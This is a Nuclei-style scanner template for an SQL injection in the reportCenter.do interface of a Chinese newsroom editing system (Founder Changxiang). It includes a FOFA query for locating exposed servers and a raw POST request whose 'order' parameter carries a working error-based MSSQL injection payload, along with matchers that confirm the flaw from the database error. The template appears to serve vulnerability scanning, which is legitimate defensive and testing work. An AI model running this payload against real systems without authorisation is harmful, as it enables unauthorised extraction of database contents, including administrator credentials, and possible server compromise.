id: fangzheng-reportCenter_do-sql

info:
  name: "方正畅享全媒体新闻采编系统reportCenter.do接口SQL注入"
  author: Unknown
  severity: high
  description: |-
    fofa: body="/newsedit/newsedit/css/login_1.css"
    该系统reportCenter.do接口组件中存在SQL注入漏洞，攻击者可通过构造恶意输入执行任意SQL命令。此漏洞允许未经授权的访问者获取数据库敏感信息（包括但不限于管理员后台凭证、用户隐私数据），并在具备高权限条件下向服务器写入可执行命令，最终可能导致服务器系统权限被完全控制。
  reference:
  - https://mp.weixin.qq.com/s/A18DJTnJY3bnMZOgRPBfUw?token=1192656222&lang=zh_CN
  tags: 方正畅享全媒体新闻采编系统



http:
- raw:
  - |
    POST /newsedit/report/reportCenter.do HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Content-Type: application/x-www-form-urlencoded
    Connection: close

    type=paperLayoutList&paperDate=2023-1-1&token=1&pageNo=1&pageSize=1&order=x' THEN 5 ELSE 5 END) AS status from (select '1x' as SYS_CURRENTSTATUS) d) tmp where cast(@@version as int)=5-- a
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '转换成数据类型 int 时失败'
    - 'Microsoft SQL'
    condition: and
  - type: status
    status:
    - 200
